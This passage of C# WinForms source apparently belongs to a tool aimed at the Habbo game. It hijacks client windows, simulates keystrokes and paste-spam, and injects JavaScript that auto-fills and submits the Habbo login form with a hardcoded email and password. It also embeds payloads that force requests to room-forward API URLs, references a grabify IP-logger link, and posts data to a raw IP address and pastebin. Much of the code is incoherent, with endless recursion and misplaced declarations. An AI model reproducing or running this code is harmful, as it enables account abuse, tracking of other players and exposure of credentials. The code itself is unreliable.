
                    return Dsipsoed[x].Handle;
                  } 
            }
            return Dsipsoed[0].MainWindowHandle;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            DisposeModule Disposed = new DisposeModule(sender, e, ClientSock);
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            wm_char.GetMousePosition();
            wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
            wm_char.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);


            foreach (var items in ClientHabboProcs)
            {
                using (var Memstream = new MemoryStream(Encoding.Default.GetBytes(items.MainWindowHandle.ToString())))
                {
                    Memstream.Write(PostMessageRefData());
                }
            }

        }

        public string PostMessageClient(DisposeModule sender)
        {
            SendKeys.Send("^V");
            SendKeys.Send("{ENTER}");
            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte Bscan, byte Bkey, int dwFlags, int dwExtraInfo);
            [DllImport("user32.dll")]
            static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
            const uint Mouse_Down = 0x0002;
            const uint Mouse_up = 0x0004;

            mouse_event(Mouse_Down, MousePosition.X, MousePosition.Y, 0, 0);
            Thread.Sleep(100);
            mouse_event(Mouse_up, MousePosition.X,MousePosition.Y, 0, 0);
            Thread.Sleep(100);

            static extern IntPtr SetParent(IntPtr hwnDChild, IntPtr hwndNewParent);
            keybd_event(0x00, 0, 0x0001, 0);
            keybd_event(0x01, 0, 0x0000, 0);
            Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
            wm_Char.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
            SendKeys.Send("^V");
            wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Enter);
            wm_Char.GetMousePosition();
          
            return (sender.ToString());
        }
        public class DisposeModule : Control

        { 
            public WebRequest GetMethod(object sender,EventArgs e, Socket Client)
            {
                byte[] Buffer = new byte[Client.ReceiveBufferSize];
                Form1 Main = new Form1();
                base.Equals(Main.richTextBox1);
                base.TextChanged += Main.richTextBox1_TextChanged;
                const string Filepath = "C:\\Users\\Georg\\OneDrive\\Desktop\\PostMessage.js";
                var FilepathJs = "@C:/temp";
                try
                {
                    OpenFileDialog OFD = new OpenFileDialog();
                    OFD.FileName = Filepath;
                    StreamReader SR = new StreamReader(OFD.FileName);
                    var Result = SR.ReadToEnd().ToString();

                    if(Result.ToString().Length>0)
                    {
                        int SendAsync = Client.Send(Encoding.Default.GetBytes(Main.PostKeyboardEvent(sender, e, this)));
                        using(MemoryStream MS = new MemoryStream(Buffer,0,Buffer.Length))
                        {
                            byte[] BufferMessage = Encoding.Default.GetBytes(Main.PostKeyboardEvent(sender, e, this));
                            Array.Resize(ref BufferMessage, SendAsync);
                            Array.Resize<byte>(ref BufferMessage, Client.Send(new byte[] { }));
                           foreach(byte b in BufferMessage)
                            {

                                byte[] HwndBuffer = new byte[] { b };
                                Mainproc.StandardInput.Write(HwndBuffer);
                                Mainproc.StandardInput.BaseStream.BeginWrite(HwndBuffer, 0, HwndBuffer.Length, null, Mainproc.MainWindowHandle);
                                Stream DataStream = new MemoryStream(Encoding.Default.GetBytes(Mainproc.StandardInput.ToString()));
                                BinaryWriter BW = new BinaryWriter(DataStream, Encoding.ASCII);
                                byte[] PostMessage = Encoding.UTF32.GetBytes(SendAsync.ToString());
                                foreach (byte x in PostMessage)
                                {
                                    BW.Write(new byte[] { x }); BinaryReader BR = new BinaryReader(DataStream, Encoding.UTF8); BR.BaseStream.BeginRead(new byte[] { x }, 0, 0, null, null);
                                    BR.Read(new byte[] { }); BR.Read(new byte[] { 0x0001 });
                                    NetworkStream NS = new NetworkStream(Client);
                                    BW = new BinaryWriter(NS, Encoding.Default);
                                    BR = new BinaryReader(NS, Encoding.UTF32);
                                }
                                Array.Resize(ref HwndBuffer, Main.ClientSock.Send(new byte[] { }));
                                Array.Resize<byte>(ref HwndBuffer, Main.ClientSock.Send(new byte[] { b }));
                                BW.Write(new byte[] { }); BW.Write(new byte[] { });
                            }
                        }

                        // MessageBox.Show("Select File");
                        // OFD.ShowDialog();

                        FilepathJs = OFD.FileName;
                        
                    }
                   if(Result.ToString().Length<0)
                    {
                        MessageBox.Show("404 File Not Found|!");
                       // OFD.ShowDialog();
                    }
                    using (var WC = new WebClient())
                    {
                        WC.BaseAddress = new Uri("https://www.pastebin.com/raw/TF9MauVK").ToString();
                        var PostAsync = WC.OpenWrite(GetMethod(sender, e, Client).RequestUri, "POST");
                        byte[] DisposedBuffer = new byte[Client.SendBufferSize];
                        List<byte[]> ArraySegment = new List<byte[]>();
                        ArraySegment.Add(Buffer);
                        for (int i = 0; i < ArraySegment.Count; i++)
                        {
                            int SendAsync = Client.Send(ArraySegment[i], 0, ArraySegment[i].Length, 0);
                            GetMethod(sender, e, Client).Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0");
                            GetMethod(sender, e, Client).Headers.Add("cookie", "\r\n\"Microsoft Edge\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"\r\nsec-ch-ua-mobile");
                            GetMethod(sender, e, Client).GetResponse().Headers.Add("cookie", APIRoom + Convert.ToBase64String(Encoding.UTF8.GetBytes("const XHR = new XMLHttpRequest(); XHR.open('POST',''" + SendAsync.ToString() + "'); XHR.send(" + SendAsync.ToString() + ");")));
                            int ReadByte = GetMethod(sender, e, Client).GetResponse().GetResponseStream().ReadByte();
                            ArraySegment.Add(new byte[] { (byte)ReadByte }); ArraySegment.Add(new byte[] { Convert.ToByte(ReadByte) });


                        }
                        ArraySegment.Add(DisposedBuffer);
                    }
                    base.Text += GetMethod(sender, e, Client).RequestUri.ToString();
                }
                catch(SocketException sockEx)
                {
                    WebRequest Getmethod = (HttpWebRequest)WebRequest.Create("https://www.habbo.com");
                    Getmethod.Method = "POST";
                    using(var GetRespStream = Getmethod.GetRequestStream())
                    {
                        byte[] BufferNode = Encoding.UTF8.GetBytes(sockEx.Message.ToString());
                        StreamWriter SW = new StreamWriter(GetRespStream, Encoding.UTF8);
                        foreach(char c in Main.PostMessageClient(this))
                        {
                            SW.Write(c.ToString().ToCharArray());
                        }
                        MessageBox.Show(DateTime.Now.ToString() + "Connection to server has ben lost");
                    }
                }
               // MessageBox.Show(Encoding.Default.GetString(Buffer, 0, Buffer.Length));

                return GetMethod(sender, e, Client);
            }
            public DisposeModule(object sender, EventArgs e, Socket Client)
            {
               
                foreach (var items in ClientHabboProcs)
                {
                    GetMethod(sender, e, Client).RequestUri.Equals("https://www.pastebin.com/raw/TF9MauVK");
                    GetMethod(sender, e, Client).Headers.Add("cookie", "");

                    GetMethod(sender, e, Client);

                    MessageBox.Show("Disconnection" + "Disposed Module" + Client.Handle.ToString());
                    Type Objref;
                    return;
                }

            }
        }

        public byte[] PostMessageRefData()
        {
            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte Bscan, byte Key, int dwFlags, int dwExtraInfo);
            static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
            const uint Mouse_Down = 0x0002;
            const uint Mouse_up = 0x0004;

            Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();


            foreach (var items in ClientHabboProcs)

            {

                mouse_event(Mouse_Down, MousePosition.X, MousePosition.Y, 0, 0);
                Thread.Sleep(100);
                mouse_event(Mouse_up, MousePosition.X, MousePosition.Y, 0, 0);
                Thread.Sleep(100);
            }


            return PostMessageRefData();
        }
        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            DisposeModule Disposed = new DisposeModule(sender, e, ClientSock);
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            wm_char.GetMousePosition();
            wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
            wm_char.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);

    
            foreach(var items in ClientHabboProcs)
            {
                using(var Memstream = new MemoryStream(Encoding.Default.GetBytes(items.MainWindowHandle.ToString())))
                {
                    Memstream.Write(PostMessageRefData());
                }
            }

        }

        public IntPtr PostMessageCick()
        {
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            wm_char.GetMousePosition();
            wm_char.Click();

            return panel4.Handle;
        }
        public int[] PacketStructure = new int[2] { 0, 0 };


        public Byte[] Sbyte()
        {
            [DllImport("user32.dll")]
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            Process[] Client = Process.GetProcessesByName(Process.GetProcessById(int.Parse(textBox1.Text.ToString())).ProcessName);
            foreach (var items in Client)
            {

                ClientHabboProcs.Add(items);
                SetParent(items.MainWindowHandle, panel4.Handle);
                // Get handle to form.
                IntPtr hwnd = items.MainWindowHandle;

                // Create new graphics object using handle to window.
                Graphics newGraphics = Graphics.FromHwnd(hwnd);

                // Draw rectangle to screen.
                newGraphics.DrawRectangle(new Pen(Color.Red, 3), 0, 0, 200, 100);
                int Post()
                {
                    Desktop.Robot.Robot Auto = new Desktop.Robot.Robot();
                    Auto.GetMousePosition();

                    return 0;
                }
                int Invoke()
                {
                    Desktop.Robot.Robot Auto = new Desktop.Robot.Robot();
                    Auto.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Enter);
                    return 0;
                }

                newGraphics.DrawRectangle(new Pen(Color.Red, Post()), 0, 0, Invoke(), Invoke());
                newGraphics.Dispose();
                Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                SetParent(PostMessageCick(), items.MainWindowHandle);
                SetParent(PostMessageCick(), panel4.Handle);
                wm_Char.MouseMove(int.Parse(panel4.Cursor.Handle.ToString()), int.Parse(panel4.Handle.ToString()));
                wm_Char.MouseMove(int.Parse(items.MainWindowHandle.ToString()), int.Parse(items.MainWindowHandle.ToString()));
                wm_Char.Click();
            }
            return Sbyte();
        }
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {



            var Proc = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
            Process[] Disposed = Process.GetProcessesByName(Proc.ProcessName);
            foreach(var items in Disposed)
            {
                ClientHabboProcs.Add(items);

                MessageBox.Show(items.MainWindowHandle.ToString());
            }

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {



        }
        public const string Webmessage = "var hotel_button_native = document.getElementsByClassName(\"hotel-button-native__text\");\r\nhotel_button_native[0].innerText = \"https://www.habbo.com//api/public/rooms/6/forward\";\r\n\r\nvar XHR = new XMLHttpRequest();\r\nXHR.open(\"POST\",hotel_button_native[0].innerText.toString().replace(\"f\",\"F\"))\r\n//XHR.send(window.location.href);\r\n  //XHR.send(null);\r\n//var http = \"https://grabify.link/NZQ9JB\";\r\n\r\nvar oimg = document.createElement(\"img\");\r\noimg.setAttribute(\"src\",hotel_button_native[0].innerText.toLowerCase());\r\noimg.innerHTML = \"onClick=PostMethod()\";\r\n\r\nfunction PostMethod()\r\n\r\n\r\n\r\n{\r\n    var XHRNode = new XMLHttpRequest();\r\n    XHRNode.open(\"GET\",window.location);\r\n    document.body.appendChild();\r\n\r\n}\r\n//document.write(oimg.outerHTML);\r\nvar hotel_button_native = document.getElementsByClassName(\"hotel-button-native__text\");\r\n//hotel_button_native[0].innerText = \"https://www.habbo.com//api/public/rooms/6/forwward\";\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n";
        //"var hotel_button_native = document.getElementsByClassName(\"hotel-button-native__text\");\r\nhotel_button_native[0].innerText = \"https://www.habbo.com//api/public/rooms/80214954/forward\";\r\n// \r\n\r\n\r\n\r\nvar XHR = new XMLHttpRequest();\r\nXHR.open(\"POST\",hotel_button_native[0].innerText.toString().replace(\"f\",\"F\"))\r\n//XHR.send(window.location.href);\r\n\r\n//var http = \"https://grabify.link/NZQ9JB\";\r\nhotel_button_native[0].innerText=http.toUpperCase();\r\nvar oimg = document.createElement(\"img\");\r\noimg.setAttribute(\"src\",hotel_button_native[0].innerText.toLowerCase());\r\noimg.innerHTML = \"onClick=PostMethod()\";\r\n\r\nfunction PostMethod()\r\n{\r\n    var XHRNode = new XMLHttpRequest();\r\n    XHRNode.open(\"GET\",window.location);\r\n    document.body.appendChild();\r\n\r\n}\r\n//document.write(oimg.outerHTML);\r\nvar hotel_button_native = document.getElementsByClassName(\"hotel-button-native__text\");\r\nhotel_button_native[0].innerText = \"https://www.habbo.com//api/public/rooms/80214954/Forward\";\r\n\r\n\r\n\r\n\r\n  //XHR.send(null);\r\n\r\n\r\n\r\n\r\n\r\n // hotel_button_native[0].dispatchEvent(event);\r\n\r\n";

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            var Filepath = "C:\\Users\\Georg\\OneDrive\\Documents\\Index.js";
            StreamWriter SW = new StreamWriter(Filepath);
            SW.Write(Webmessage);
            SW.Flush();
            ServerSocket.Close();
            ServerSocket.Dispose();

            SW.Dispose();
            //this.Dispose();
            Process.GetCurrentProcess().Kill();
        }
        public const string APIRoom = "var hotel_button_native = document.getElementsByClassName(\"hotel-button-native__text\");\r\nhotel_button_native[0].innerText = \"https://www.habbo.com//api/public/rooms/6/forward\";\r\n\r\nvar XHR = new XMLHttpRequest();\r\nXHR.open(\"POST\",hotel_button_native[0].innerText.toString().replace(\"f\",\"F\"))\r\n//XHR.send(window.location.href);\r\n  //XHR.send(null);\r\n//var http = \"https://grabify.link/NZQ9JB\";\r\n\r\nvar oimg = document.createElement(\"img\");\r\noimg.setAttribute(\"src\",hotel_button_native[0].innerText.toLowerCase());\r\noimg.innerHTML = \"onClick=PostMethod()\";\r\n\r\nfunction PostMethod()\r\n\r\n\r\n\r\n{\r\n    var XHRNode = new XMLHttpRequest();\r\n    XHRNode.open(\"GET\",window.location);\r\n    document.body.appendChild();\r\n\r\n}\r\n//document.write(oimg.outerHTML);\r\nvar hotel_button_native = document.getElementsByClassName(\"hotel-button-native__text\");\r\n//hotel_button_native[0].innerText = \"https://www.habbo.com//api/public/rooms/6/forwward\";\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n";
        public IntPtr Get(Desktop.Robot.Robot Auto, object sender, EventArgs e)
        {
            IntPtr hwnd = IntPtr.Zero;
            foreach (Process x in Process.GetProcessesByName(Process.GetProcessById(int.Parse(textBox1.Text.ToString())).ProcessName))

            {
                Auto.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
                Auto.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
                Auto.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
                Auto.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                Auto.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                Auto.GetMousePosition();
                hwnd = x.MainWindowHandle;
                return x.Handle;
            }
            // 
            return hwnd * (Get(Auto, sender, e));
        }
        public string Post(Desktop.Robot.Robot auto, object sender, EventArgs e)
        {
            IntPtr hwnd = IntPtr.Zero;
            foreach (Process x in Process.GetProcessesByName(Process.GetProcessById(int.Parse(textBox1.Text.ToString())).ProcessName))

            {
                [DllImport("user32.dll")]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);

                /// Foreground dll's
                [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
                static extern IntPtr GetForegroundWindow();

                [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
                static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

                /// Console hide dll's
                [DllImport("kernel32.dll")]
                static extern IntPtr GetConsoleWindow();

                [DllImport("user32.dll")]
                static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
                foreach (var items in ConnectionHandler)
                {
                    var Buffer = items.ReceiveBufferSize;
                    var Sb = new StringBuilder(Buffer);
                    Message.Create(x.MainWindowHandle, (int)Get(auto, sender, e), x.Handle, x.Handle);
                    GetWindowText(x.MainWindowHandle, Sb, 0);
                    GetForegroundWindow();
                    ShowWindow(x.MainWindowHandle, 0);
                    [DllImport("user32.dll")]
                    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

                    const uint WM_KEYDOWN = 0x0100;
                    PostMessage(x.MainWindowHandle, WM_KEYDOWN, (int)Get(auto, sender, e), 0);
                    Message.Create(x.Handle, int.Parse(PostMessage(x.MainWindowHandle, WM_KEYDOWN, (int)Get(auto, sender, e), 0).ToString()), x.MainWindowHandle, Process.GetCurrentProcess().MainWindowHandle);


                    auto.GetMousePosition();
                    hwnd = x.MainWindowHandle;
                }
                return x.MainWindowTitle.ToString();
            }
            auto.GetMousePosition();

            return sender.ToString();
        }


        public string PostKeyboardEvent(object sender, EventArgs e,DisposeModule Module)
        {

            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte Bscan, byte Bkey, int dwFlags, int dwExtraInfo);
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            webView21.Source = new Uri("http://localhost:4200/");
            const string script = "var XHR = new XMLHTTPRequest(); function Post(){window.location='http://localhost:443/';} var Items = []; var oimg = document.QuerySelectorAll('img'); for(const el of oimg){Items.Push(el);} for(var x =0;x<Items.length;x++){console.log(document.elemntFromPoint(x,x)+elem)); XHR.open('GET',window.location); XHR.send(Items[0]); var Dispatchevent = Post(); XHR.send(Dispatchevent);}";
            var PostItem = script + "window.location.href='https://www.habbo.com/";
            Console.Write(PostItem);
            webView21.ExecuteScriptAsync("let event = new MouseEvent('click',\r\n     {\r\n        bubbles:true,\r\n\r\n        cancelable:true,\r\n\r\n        window:true\r\n\r\n    })");
            webView21.ExecuteScriptAsync("var Password = \"form__input login-form__input ng-dirty ng-valid-parse ng-touched ng-empty ng-invalid ng-invalid-required\";\r\nvar Pass = document.getElementsByClassName(Password);\r\nPassword[1].value = \"hab123\";var Email = \"form__input login-form__input ng-valid-email ng-dirty ng-touched ng-empty ng-invalid ng-invalid-required\";\r\nvar Elem = document.getElementsByClassName(Email);\r\nEmail[0].value = \"instahxd01@outlook.com\"; var SubmitBtn = document.getElementsByClassName('login-form__button habbo-login-button'); \r\n");
            webView21.ExecuteScriptAsync("SubmitBtn[0].addEventListener('click',event);");
            webView21.ExecuteScriptAsync("SubmitBtn[0].dispatchEvent(event);");
            webView21.ExecuteScriptAsync("console.log("+Module.ToString()+");");
            foreach (var items in ClientHabboProcs)
            {
                const int PublicKey = 8;
                const int API = 3;
                byte[] Buffer = Encoding.Default.GetBytes(items.WaitForInputIdle().ToString());
                var Recv = new byte[] { (byte)Encoding.ASCII.GetBytes(items.WaitForInputIdle().ToString())[0],0,0 };
                using (MemoryStream MS = new MemoryStream(Recv, 0, Recv.Length))
                {
                    keybd_event(0x01, 0, 0x0001, 0);
                    MousePosition.X.Equals(items.MainWindowHandle);
                    MousePosition.Y.Equals(items.Handle);
                    SendKeys.SendWait("^V");
                    HttpClient Hclient = new HttpClient();
                    if(items.MainWindowTitle.ToString().Length>=8)
                    {
                        var User = items.MainWindowTitle.ToString().Substring(PublicKey);
                        var Password = User.ToString().Substring(API);
                        Console.WriteLine(true+"https://www.habbo.com/profile/"+Password.ToString()+DateTime.Now.ToString());
                        HttpClient HClient = new HttpClient();
                        Hclient.BaseAddress = new Uri("http://69.172.200.161:443");
                        using(var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, webView21.Source.ToString()+"/Profile/"+Password))
                        {
                            var Filepath = "C:\\Users\\Georg\\OneDrive\\Desktop\\PostMessage.js";
                            Recv = System.IO.File.ReadAllBytes(Filepath);
                            Byte[] HWnd = File.ReadAllBytes(Filepath);

                            Stream DataStream = new MemoryStream(HWnd, 0, HWnd.Length);
                            List<object> DisposedItems = new List<object>();
                            RichTextBox HMessage = new RichTextBox();
                            HMessage.Show();
                            panel4.Controls.Add(HMessage);
                            IntPtr hwnd = HMessage.Handle;

                            if(hwnd!=IntPtr.Zero)
                            {
                                Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                                wm_char.GetMousePosition();

                                wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                            }

                            var ItemObj = HMessage.BeginInvoke((System.Windows.Forms.MethodInvoker)delegate { Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot(); wm_Char.MouseMove(MousePosition.X, MousePosition.Y); SendKeys.Send("^V"); wm_Char.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter); wm_Char.GetMousePosition(); wm_Char.Click(); keybd_event(0x001, 0, 0x000, 0); keybd_event(0x0D, 0, 0x0001, 0); });
                            //object ModuleDispose = Invoke((System.Windows.Forms.MethodInvoker)delegate { SendKeys.Send("{ENTER}"); });

                            DisposedItems.Add((ItemObj));
                            List<object> ClientDisposedItem = new List<object>();
                            ClientDisposedItem.Add(items);
                            richTextBox1.CanSelect.Equals(false);
                            richTextBox1.SelectNextControl(this, false, false, true, true);
                            richTextBox1.SelectNextControl(this, false, false, true, false);
                            this.SelectNextControl(richTextBox1, true, false, true, true);
                            for(int i = 0; i < DisposedItems.Count;i++)
                            {
                                StreamWriter SW = new StreamWriter(DataStream, Encoding.UTF8);
                                SW.Write(ClientDisposedItem[i]);
                                ClientDisposedItem[i] = DisposedItems[i];
                                DisposedItems[i] = ClientDisposedItem[i];
                                SW.Write(Encoding.UTF8.GetBytes(DisposedItems[i].ToString()));
                                SW.Flush();
                                SW.Close();
                                SW.Dispose();

                            }
                            webView21.ExecuteScriptAsync("window.location.href="+"https://www.habo.com/Profile/"+Password.ToString()+";");
                            HttpReqMsg.Content = new StringContent(ClientDisposedItem[0].ToString(), Encoding.Default, "application/json");
                            webView21.ExecuteScriptAsync("var XHR = new XMLHttpRequest(); XHR.open('POST',window.location); XHR.send(" + PostMessageClient(Module)+");");
                         
                        }
                    }

                  if (items.MainWindowTitle.ToString().Length <= 8)
                    {
                        Desktop.Robot.Robot Auto = new Desktop.Robot.Robot();
                        Auto.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                        SendKeys.SendWait("{ENTER}");
                        keybd_event(0x0D, 0, 0x0001, 0);
                        Auto.GetMousePosition();
                       Auto.MouseMove(MousePosition.X, MousePosition.Y);
                        Auto.Click();
                    }
                   // Hclient.BaseAddress = new Uri(webView21.Source.ToString()"/Profile/"+items.MainWindowTitle.ToString().Substring())
                    Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                    wm_Char.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                    SendKeys.SendWait("{ENTER}");
                    keybd_event(0x0D, 0, 0x0001, 0);
                    wm_Char.GetMousePosition();
                    wm_Char.MouseMove(MousePosition.X, MousePosition.Y);
                    wm_Char.Click();
                }
            }
            webView21.Source = new Uri("https://www.habbo.com/logout/");
           
            return sender.ToString();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {

            webView21.Source = new Uri("http://localhost:4200/");
            const string script = "var XHR = new XMLHTTPRequest(); function Post(){window.location='http://localhost:443/';} var Items = []; var oimg = document.QuerySelectorAll('img'); for(const el of oimg){Items.Push(el);} for(var x =0;x<Items.length;x++){console.log(document.elemntFromPoint(x,x)+elem)); XHR.open('GET',window.location); XHR.send(Items[0]); var Dispatchevent = Post(); XHR.send(Dispatchevent);}";
            var PostItem = script + "window.location.href='https://www.habbo.com/";
            Console.Write(PostItem);
            webView21.ExecuteScriptAsync("let event = new MouseEvent('click',\r\n     {\r\n        bubbles:true,\r\n\r\n        cancelable:true,\r\n\r\n        window:true\r\n\r\n    })");
            webView21.ExecuteScriptAsync("var Password = \"form__input login-form__input ng-dirty ng-valid-parse ng-touched ng-empty ng-invalid ng-invalid-required\";\r\nvar Pass = document.getElementsByClassName(Password);\r\nPassword[1].value = \"hab123\";var Email = \"form__input login-form__input ng-valid-email ng-dirty ng-touched ng-empty ng-invalid ng-invalid-required\";\r\nvar Elem = document.getElementsByClassName(Email);\r\nEmail[0].value = \"instahxd01@outlook.com\"; var SubmitBtn = document.getElementsByClassName('login-form__button habbo-login-button'); \r\n");
            webView21.ExecuteScriptAsync("SubmitBtn[0].addEventListener('click',event);");
            webView21.ExecuteScriptAsync("SubmitBtn[0].dispatchEvent(event);");

            webView21.ExecuteScriptAsync("alert('Disconnection'");
            DisposeModule Module = new DisposeModule(sender, e, ClientSock);

            webView21.Source = new Uri("https://www.habbo.com/logout/");

            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte Bkey, byte Bscan, int dwFlags, int dwExtraInfo);

            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            //var Postitem = null;
       


          foreach(Process item in ClientHabboProcs)
            {
                using(MemoryStream MS = new MemoryStream(Encoding.UTF32.GetBytes(item.MainWindowTitle.ToString())))
                {
                    Byte[] Hwnd = new byte[item.VirtualMemorySize];
                    for(int i = 0; i < Hwnd.Length;i++)
                    {
                        Hwnd[i] += Encoding.Default.GetBytes(item.MainWindowHandle.ToString())[0];
                        int SendAsync = ClientSock.Send(Hwnd, 0, Hwnd[i], 0);
                        [DllImport("user32.dll")]
                        static extern IntPtr SetParent(IntPtr HwndChild, IntPtr HWNDNewParent);
                        SetParent(SendAsync, item.MainWindowHandle);
                        SetParent(item.MainWindowHandle, SendAsync);
                        Array.Resize<byte>(ref Hwnd, SendAsync);
                        Hwnd[i] += Encoding.Default.GetBytes(item.MainWindowHandle.ToString())[0];

                        Array.Resize(ref Hwnd, ClientSock.Send(Encoding.ASCII.GetBytes(PostKeyboardEvent(sender, e, Module))));
                        richTextBox1.Text += item.MainWindowTitle.ToString();
                        
                       
                    }
                }
            }


        }





        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            var script = "var elem = document.getElementsByClassName(\"form-control\");";
            var Post = "elem[0].value='https://www.habbo.com'" + "  let evt = new MouseEvent(\"click\", {\r\n    bubbles: true,\r\n    cancelable: true,\r\n    view: window,\r\n  });\r\n;";
            var dispatchEvent = "var submit = document.getElementsByClassName('btn btn-blue'); submit[0].dispatchEvent(evt);";
            webView21.ExecuteScriptAsync(script + Post + dispatchEvent);



        }
        public static List<Socket> ConnectionHandler = new List<Socket>();
        public string GetRoom(object sender, EventArgs e)
        {
            var Fiepath = "C:\\Users\\Georg\\OneDrive\\Documents\\Index.js";
            StreamWriter SW = new StreamWriter(Fiepath);
            SW.WriteLine(APIRoom.Replace("6", textBox2.Text.ToString().Replace("//XHR.send(null);", "XHR.send(null);")));
            SW.Flush();
            SW.Close();
            SW.Dispose();
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            return GetRoom(sender, e);
        }

        private void checkBox2_CheckedChanged_1(object sender, EventArgs e)
        {
            const string API = "/?__cpo=aHR0cHM6Ly93d3cuaGFiYm8uY29t";
            var IPendpoint = webView21.Source.ToString().Replace(API, string.Empty).Replace("https://", string.Empty);
            IPEndPoint Localendpoint = new IPEndPoint(IPAddress.Parse(IPendpoint.ToString()), 1320);
            Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ConnectionHandler.Add(Client);
            Client.Connect(Localendpoint);


            byte[] Message = Encoding.UTF8.GetBytes(GetRoom(sender, e));
            Client.Send(Message, 0, SocketFlags.None);
            listView1.Items.Add(Localendpoint.ToString() + "Web");
            Clipboard.SetText(IPendpoint);
            webView21.Source = new Uri("https://www.proxyium.com");
            timer2.Stop();

        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {

        }
         class PostMesageData:EventArgs 
        {
           public PostMesageData(IntPtr hwnd)
            {
                [DllImport("user32.dll", SetLastError = true)]
                static extern void keybd_event(byte bScan, byte bKey, int dwFlags, int dwExtraInfo);
                keybd_event(0x00, 0, 0x0000, 0);
                keybd_event(0x01, 0, 0x0001, 0);
                Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Enter);
                wm_char.GetMousePosition();
                wm_char.MouseMove(MousePosition.X, MousePosition.Y);
                wm_char.GetMousePosition();
                PostMessage();
            }
            public IntPtr SendMessage()
            {

                foreach(var items in ClientHabboProcs)
                {
					[DllImport("user32.dll", SetLastError = true)]
					static extern void keybd_event(byte bScan, byte bKey, int dwFlags, int dwExtraInfo);
					keybd_event(0x00, 0, 0x0000, 0);
					keybd_event(0x01, 0, 0x0001, 0);
					Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
					wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Enter);
					wm_char.GetMousePosition();
					wm_char.MouseMove(MousePosition.X, MousePosition.Y);
					wm_char.GetMousePosition();
					return items.MainWindowHandle;
                }
                return SendMessage();
            }
            public string PostMessage()
            {
				[DllImport("user32.dll", SetLastError = true)]
				static extern void keybd_event(byte bScan, byte bKey, int dwFlags, int dwExtraInfo);
				keybd_event(0x00, 0, 0x0000, 0);
				keybd_event(0x01, 0, 0x0001, 0);
				Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
				wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Enter);
				wm_char.GetMousePosition();
				wm_char.MouseMove(MousePosition.X, MousePosition.Y);
				wm_char.GetMousePosition();
				return PostMessage();
            }
        }

        public String PostDataEvent()
        {
          foreach(var items in ClientHabboProcs)
            {
                PostMesageData Host = new PostMesageData(items.MainWindowHandle);
